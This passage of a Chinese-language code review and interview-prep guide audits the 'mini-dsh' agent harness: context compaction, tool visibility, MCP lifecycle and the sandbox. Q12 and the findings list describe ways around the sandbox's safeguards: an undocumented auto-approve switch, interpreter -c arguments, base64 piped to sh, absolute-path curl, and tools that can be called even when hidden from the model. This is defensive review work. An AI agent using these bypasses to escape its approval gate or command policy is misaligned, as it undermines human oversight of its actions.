   - 代码：`alwaysVisible` 默认 `[]`（`src/core/deterministic-tool-visibility.js:10`），`createToolRoutingFromEnv` 的 deterministic / progressive 分支都没有传它（`src/core/tool-visibility-config.js:27`–`:47`），`src/index.js:41`–`:46` 也没有。只有测试手工构造才出现非空 pinned（`test/deterministic-tool-visibility.test.js:86`–`:131`）。
   - 修正说法：机制存在，但默认 production 里 pinned 集合为空。

3. **自动批准旁路未文档化**（中等）。
   - CLI 启动提示：`Writes and bash execution ask [Y/n] first`（`src/plugins/cli.js:51`）。
   - 代码：`SandboxRuntime.approve` 在 `autoApprove=true` 时直接通过（`src/core/sandbox-runtime.js:118`–`:120`）；插件从 `config.autoApprove` 或环境变量 `MINI_DSH_AUTO_APPROVE=1` 读取（`src/plugins/sandbox.js:16`）。
   - `README.zh-CN.md` 的环境变量清单与 `.env.example` 都没有 `MINI_DSH_AUTO_APPROVE`。面试若被问“人工审批是不是绝对”要主动说“可配置旁路”。

4. **`allowHosts` 不能从插件配置注入**（低到中）。
   - `SandboxRuntime` 构造支持 `allowHosts`（`src/core/sandbox-runtime.js:80`–`:84`），但 `src/plugins/sandbox.js:13`–`:17` 只传 `workspace` 与 `autoApprove`；生产只能用 `DEFAULT_ALLOW_HOSTS`（`src/core/sandbox-runtime.js:43`）。
   - 文档把命令策略概括为 denylist（`ARCHITECTURE.zh-CN.md:248`），实际上网络部分是硬编码 allowlist。

5. **“3 bytes/token 是保守 heuristic” 未经真实 tokenizer 验证**（低到中）。
   - 代码注释与测试名用 conservative / conservatively（`src/core/token-meter.js:4`–`:5`；`test/token-meter.test.js:66`）。
   - 固定字节除数对中文 / emoji / 代码不可能一致保守；仓库没有跟 Provider tokenizer 做对照实验。面试时应说“deterministic guard，不是 accuracy guarantee”。

6. **`tool_search` “搜索完整已注册 Catalog” 少了 self-exclusion**（低）。
   - 文档：`ARCHITECTURE.zh-CN.md:158`。
   - 代码：`.filter((tool) => tool.name !== TOOL_SEARCH_NAME)`（`src/tools/tool-search.js:41`）。这是合理行为，但“完整”措辞不精确。

7. **“Compaction 保留最近原始消息” 只保证最新一条 model-context 事件**（低，措辞）。
   - 文档：`ARCHITECTURE.zh-CN.md:114` “保留最近原始消息”。
   - 代码：`beforeSeq: latestRaw.seq` 是开区间，只排除 `latestRaw` 本身（`src/core/context-compaction-planner.js:35`–`:39`；`src/core/context-projector.js:86`）。实践上因为边界类型限制，通常会保留最近一问一答，但“最近原始消息”数量并不由 planner 显式保证。

8. **MCP 脱敏只覆盖 snapshot，不覆盖抛出的 Error**（低，但安全相关）。
   - `snapshot.lastError` 会 redact（`src/core/mcp-manager.js:259`–`:271`）。
   - `connect/disconnect/reload` rethrow 原始 error（`:173`、`:192`），`dispose` throw `failure.reason`（`:126`）。CLI 优先打印 snapshot 的脱敏 message（`src/plugins/cli.js:128`–`:133`），但程序化调用者可能拿到未脱敏错误。

9. **“命令策略是 denylist” 是简化说法**（低）。
   - 它同时包含：workspace 路径 allowlist（`src/core/sandbox-runtime.js:329`–`:358`）、网络 host allowlist（`:264`–`:327`）、命令形态 denylist（`:146`–`:216`）。说“应用层 policy gate”比“denylist”准确。

10. **`reservedOutputTokens` 默认值有两条路径**（低，已文档化但容易混）。
    - 环境变量路径 `contextPolicyFromEnv`：窗口启用且未指定 → 4096（`src/core/context-policy-config.js:3`、`:13`–`:18`）。
    - 直接 `new ContextManager({policy:{maxContextTokens:...}})` / 直接 `normalizeContextPolicy`：默认 0（`src/core/context-policy.js:3`）。
    - `ARCHITECTURE.zh-CN.md:112` 写的是“CLI 启用窗口后”，限定语准确；但若用程序化 API，需要自己设置 reserved。
---

## 10. 面试官可能追问的深度问题与精确答案要点

### Q1. `reservedOutputTokens` 是不是就是请求里的 `max_tokens`？
**不是。** 它只在本地把输入预算扣小：`availableInputTokens = maxContextTokens - reservedOutputTokens`（`src/core/context-policy.js:63`），用来保证“输入 + 预留输出”不越过窗口。DeepSeek 适配器构造请求体时完全没传 `max_tokens`（`src/models/deepseek.js:26`–`:35`）。真正的输出预算在另一个体系：RunPolicy 的 `maxOutputTokens` 基于 Provider 返回的 `usage.outputTokens` 累计判断（`src/core/run-controller.js:184`–`:188`）。所以这两个概念不要混。

### Q2. 既然 `exact=false`，为什么还敢用它做上下文决策？误差会怎样？
- 它是 provider-neutral 的“deterministic pressure guard”，接口可注入替换；`model` 参数被刻意忽略（`src/core/token-meter.js:4`–`:9`）。
- 误差方向天然存在：固定 3 bytes/token 对英文 / 代码可能高估，对 CJK / emoji 可能低估（`src/core/token-meter.js:1`、`:22`）。
- 低估可能把超窗请求发给 Provider；高估会过早压缩 / 过早 `context_overflow`。因此它只用于本地保护，不用于计费；Run 预算另有 Provider usage 账（`src/core/run-controller.js:80`–`:96`）。
- 面试可以补一句：如果要精确，应该注入模型 tokenizer，接口已经留好（`ContextManager` / `Planner` 的依赖注入，`src/core/context-manager.js:16`–`:18`；`src/core/context-compaction-planner.js:13`–`:18`）。

### Q3. 为什么压缩不直接删除旧消息 / 旧事件？
- Event Log 是 source of truth，压缩只是“视图游标”：`prepare()` 只 append 一个 `context/compaction`（`src/core/context-manager.js:63`），`project()` 只跳过 `seq <= shadowedThroughSeq` 的事件（`src/core/context-projector.js:24`–`:27`）。
- 保留原始事件后：lineage 可校验（`:117`–`:161`）、损坏压缩可回退（`test/context-compaction.test.js:207`–`:229`）、重启 resume 投影完全一致（`:452`–`:481`）。
- 代价：磁盘不缩小、每步投影 O(n)；如果面试官追问“为什么不单独维护压缩后短历史”，答案是为了审计 / 恢复 / 可重建。

### Q4. Planner 怎么避免从 tool call 和 tool result 中间切一刀？
- `findProtocolSafeBoundaries` 维护 `openToolCalls` 集合；只有 `assistant/message` 或 `tool/result` 且 open 集合为 0 时才是边界（`src/core/context-projector.js:78`–`:104`）。
- 单个 call 必须等 result；并行多个 call 必须全部 result（测试 `test/context-compaction.test.js:141`–`:183`）。
- Planner 还传 `beforeSeq: latestRaw.seq`（开区间），保证最新一条原始 model-context 事件永远不会被压掉（`src/core/context-compaction-planner.js:35`–`:39`；`src/core/context-projector.js:86`）。
- 未闭合调用由 session 恢复补 synthetic `tool/result`（`src/core/session-runtime.js:133`–`:164`），否则该调用之后的边界全部被封死。

### Q5. 如果压缩后仍然 hard limit 怎么办？如果压缩让 token 变多怎么办？
- Planner 的候选循环只有在某候选 `afterTokens <= targetTokens` 时立即返回；否则取 `afterTokens` 最小者，并且只有在 `best.tokens < before` 时才返回，否则返回 `null`（`src/core/context-compaction-planner.js:87`–`:91`）。所以“压完更大”不会被接受。
- `prepare()` 若拿到 plan 会先 append，再重新 project；Controller `recordContextPressure` 看到仍 `hard_limit` 就返回 `context_overflow`，本轮不发 LLM 请求（`src/core/agent-loop-runtime.js:147`–`:159`；`src/core/run-controller.js:141`）。
- 测试：无 safe boundary 时不追加压缩、LLM 0 次、stopReason=context_overflow（`test/context-compaction.test.js:483`–`:512`）；即使压缩后仍 hard，也先留下压缩事件再停止（`:514`–`:552`）。

### Q6. Deterministic Top-K 为什么不是“最多 12 个 schema”的硬上限？
- 小 catalog 直接全量，不适用 Top-K（`src/core/deterministic-tool-visibility.js:25`）。
- 大 catalog 时结果 = Top-K（不含 pinned）+ pinned，所以可到 `maxVisibleTools + pinned.length`（`:34`–`:38`）。
- 无正分命中时 fallback `'all'` 直接全量（`:30`–`:32`）。
- Progressive 还要再加 `tool_search` 和当前 Run 激活集（`src/core/progressive-tool-visibility.js:19`–`:22`）。
- 文档本身也承认不是绝对上限（`ARCHITECTURE.zh-CN.md:156`）。

### Q7. 工具排序为什么不用 embedding / 语义检索？中文 query 会怎样？
- 选的是确定性、离线、零网络、零模型调用的词法排序：纯 ASCII token + 分数（`src/core/tool-ranking.js:3`–`:46`）。
- 中文没有 `[a-z0-9]` token，query token 为空直接返回 `[]`（`:9`–`:11`、`:23`–`:31`）；正式测试里中文用户输入由模型把 `tool_search` 的 query 改写成英文 `github issues`（`test/progressive-tool-search.test.js:242`–`:250`、`:293`–`:299`）。
- 取舍：换来确定性、可测试、低成本；代价是跨语言 / 同义词 / 语义相似度全部缺失。Progressive 的补救是“让模型先搜索”，而不是“让 harness 懂语义”。

### Q8. “可见性 ≠ 授权”具体怎么体现？为什么这是个危险点？
- LLM 请求只包含 `view(visibleNames).schemas()`（`src/core/agent-loop-runtime.js:137`）；但执行是 `this.tools.execute(call.name, ...)`，ToolRuntime 只按注册表查 name，不检查可见性（`:264`；`src/core/tool-runtime.js:100`–`:103`）。
- 测试直接证明：visibility 只给 `tool-a`，`tool-b` 不可见，但工具内部调用 `tools.execute('tool-b')` 仍成功（`test/tool-visibility.test.js:44`–`:57`、`:138`–`:139`）。
- 推论：任何已注册工具（包括已连接的 MCP 工具）都能被模型按名调用；要做访问控制，必须在 ToolRuntime / policy / approval 层实现。当前项目把它定位为 schema 成本优化，不是安全边界（`docs/DESIGN_DECISIONS.zh-CN.md:35`–`:40`）。

### Q9. `tool_search` 为什么不顺手连接休眠的 MCP server？
- 它只依赖 `ToolCatalog.snapshot()`，即 `ctx.tools.list()` 的只读快照（`src/tools/tool-search.js:37`–`:42`；`src/core/tool-catalog.js:9`–`:12`），没有 `mcp` inject / import。
- MCP 连接是显式 `McpManager.connect`（`src/core/mcp-manager.js:65`–`:70`），由 `/mcp connect` 或插件调用触发（`src/plugins/cli.js:122`–`:136`）。
- 如果搜索隐式连接：搜索会变成可能阻塞 / 失败 / 产生远端副作用的网络操作，破坏“Phase 1 先本地发现、Phase 2 再显式连接”的边界；而且未连接的工具根本不在 catalog 里。
- 代价：Progressive 本身不能发现“配置了但还没连接”的 MCP 能力；必须有人 / 策略先 connect。

### Q10. 为什么 `ACTIVE` 不能等价于“远端健康”？
- `ACTIVE` 只在本地 `#activate` 成功返回 `{dispose}` 之后设置（`src/core/mcp-manager.js:162`–`:168`），没有 ping / heartbeat / 远端 enumerate。
- 对已 `ACTIVE` 的 connect 直接返回 snapshot（`:155`），不会探测远端。
- 远端协议、transport、重连、工具发现由官方 `@deepseek-ai/dsh-mcp-client` 负责（`ARCHITECTURE.zh-CN.md:192`–`:208`；`README.zh-CN.md:97`–`:105`）。
- 远端故障的可见表现是“工具调用失败，作为 Tool Result 回到 loop”，而不是 state 变成 FAILED。面试可说：项目刻意把 lifecycle 与 remote health 分层，避免一个本地状态误导恢复策略。

### Q11. MCP 生命周期并发与失败清理怎么做的？
- 每个 record 一条 Promise 尾链，前一个操作失败用 `previous.catch(() => {})` 吞掉后再跑下一个，所以失败不会毒化队列（`src/core/mcp-manager.js:138`–`:148`）；同一 server FIFO，不同 server 并发（测试 `test/mcp-manager.test.js:284`–`:323`）。
- activation 失败：state=FAILED、fiber=null、lastError 保存，桥层负责 dispose 半成品（`:169`–`:174`；`src/plugins/mcp.js:68`–`:71`）。
- disconnect 失败：保留 fiber，state=FAILED，下一次可重试（`:189`–`:193`；测试 `:174`–`:193`）；reload 清理失败不会启动新 fiber（`:204`–`:221`）。
- `dispose` 用 `Promise.allSettled` 对每个 server 都尝试清理，只要有一个失败就抛出该原因并保留 records / 不置 disposed，因此可以再次调用重试（`:121`–`:134`；测试 `:375`–`:408`）。

### Q12. Sandbox 是安全边界吗？`[Y/n]` 在哪里触发？会被绕过吗？
- 不是 OS 隔离：类注释和架构文档都明确 `not kernel isolation / seccomp / container`（`src/core/sandbox-runtime.js:45`–`:76`；`ARCHITECTURE.zh-CN.md:250`）。
- 三层：路径 gate（`resolveInside` 词法 + realpath，内置文件工具使用，`src/utils/path.js:58`–`:78`）、命令策略（对 `bash` 工具的 `assertCommand`，`src/tools/bash.js:40`）、人工审批（bash / write_file / edit_file 调用 `approve`，`src/tools/bash.js:41`–`:46`、`src/tools/files.js:39`–`:44`、`:70`–`:75`）。
- `[Y/n]` 在 CLI 的 `askApproval` 里触发（`src/plugins/cli.js:308`–`:320`）；`autoApprove` 可绕过（`src/core/sandbox-runtime.js:118`–`:120`；`src/plugins/sandbox.js:16`）。
- 绕过（代码阅读 + 本地 ad-hoc 实验）：`python3 -c / node -e` 的引号参数不会被 tokenizer 当绝对路径；`base64 ... | sh` 不走 shell `-c` 分支；`/usr/bin/curl <url>` 因网络策略只匹配 token `curl` 且系统二进制在命令位置被放行。源码位置：`src/core/sandbox-runtime.js:360`–`:374`、`:342`–`:343`、`:207`–`:243`、`:264`–`:266`、`:340`–`:341`。
- 正确的安全表述：人工审批是权限边界；路径 gate 是较强的应用层闸门；命令 denylist 只提高事故成本；部署级安全必须另加 OS 隔离。

### Q13. Compaction lineage 被伪造 / 损坏会怎样？
- `isValidCompaction` 会重新验证 summary、区间整数、`through` 的协议边界、以及 `previousCompactionSeq` 必须指向“当前事件之前最近的有效压缩”，并要求 from 相同、through 严格递增（`src/core/context-projector.js:117`–`:161`）。
- 因此不能从更早节点 fork（测试 `test/context-compaction.test.js:259`–`:278`）；损坏的中间压缩会被跳过，投影回退到上一条有效节点或原始历史（`:280`–`:329`）。
- 已知缺口：`shadowedFromSeq` 不参与投影过滤，也未与“区间内第一条模型可见事件”交叉校验（见 3.5）。

### Q14. 每 Run 激活隔离 / 清理怎么做？工具被移除怎么办？
- 激活状态是 `Map<runId, Set<name>>`（`src/core/tool-activation-store.js:4`），`ProgressiveToolVisibility.beginRun/endRun` 都 clear 当前 runId（`src/core/progressive-tool-visibility.js:26`–`:32`）。
- `select` 每次都用当前 catalog 的 `currentNames` 过滤激活集，所以已移除工具不会继续暴露（`:15`–`:22`；测试 `test/progressive-tool-search.test.js:176`–`:192`）。
- 但 stale 名字仍占 `maxActivatedTools` 容量，直到 run 结束；没有按工具注销即时清理的 API（`src/core/tool-activation-store.js:39`–`:45`）。

---

## 11. 未验证 / 只做静态阅读的点

1. **真实 Provider 行为**：真实 DeepSeek API 是否接受“messages[0] 是 assistant 压缩摘要”的序列；`heuristic-v1` 与真实 tokenizer 的误差方向 / 幅度。本地只有 Mock LLM / 固定 meter 测试（`test/context-compaction.test.js:359`–`:429`；`test/token-meter.test.js:66`–`:76`）。
2. **真实 MCP 远端**：`ACTIVE` 时远端健康、重连、远端工具同步的真实行为；未阅读 `@deepseek-ai/dsh-mcp-client` 源码，只读了 mini-dsh 侧调用契约（`src/plugins/mcp.js:59`–`:72`）。仓库的 MCP Failure eval 使用本地 fake plugin（`ARCHITECTURE.zh-CN.md:235`）。
3. **真实云端 MCP 工具搜索**：`tool_search` 对已连接 MCP 工具的实际效果只由 fake / 本地测试覆盖；未在真实 context7 上验证。
4. **长会话性能**：`findLatestValidCompaction`、`findProtocolSafeBoundaries`、`projectSessionEvents` 都是 O(n) 扫描；没有看到超长事件日志下的 benchmark（现有 eval 是合成 / Mock）。
5. **`prepare()` 并发原子性**：只依赖 `SessionRunCoordinator` 串行化；没有多 writer / 多进程保护（`src/core/agent-loop-runtime.js:59`）。
6. **SystemPromptRuntime 的 async factory 抛错**：代码看会冒泡成 step 失败，但没有专门测试（`src/core/system-prompt-runtime.js:47`–`:48`）。
7. **`allowHosts` 的生产配置**：插件没有注入 `config.allowHosts`（`src/plugins/sandbox.js:13`–`:17`），所以“能否通过配置扩展允许 host”目前答案是不能；未在 CLI 实测。
8. **`MINI_DSH_AUTO_APPROVE` 的实际使用路径**：代码支持（`src/plugins/sandbox.js:16`），文档未列；未确认 eval / 部署脚本是否依赖它。
9. **MCP 错误脱敏的完整攻击面**：snapshot 已脱敏，但原始 Error 会抛给程序化调用者；未审计所有调用方是否会打印（`src/core/mcp-manager.js:173`、`:192`、`:126`）。

---

## 附：一句话面试总结

mini-dsh 把“事实（Event Log）— 视图（Context Projection / Compaction）— 模型可见面（Tool Visibility）— 生命周期（MCP / Sandbox）”分开了：Context 用确定性投影和有损摘要控制输入；Compaction 以“协议安全边界 + 线性 lineage + 纯追加”保证可恢复；工具可见性只是 schema 成本优化，不是权限；MCP 只管本地 fiber lifecycle，远端健康交给官方客户端；Sandbox 是应用层 policy + 人工审批，不是 OS 隔离。面试中最加分的不是背机制，而是能指出各层的**不变量**（不切 tool pair、不删原始事件、ACTIVE 不等于健康、可见性不等于授权）和**明确的边界**（heuristic token、ASCII 词法、denylist 不完整、TOCTOU）。
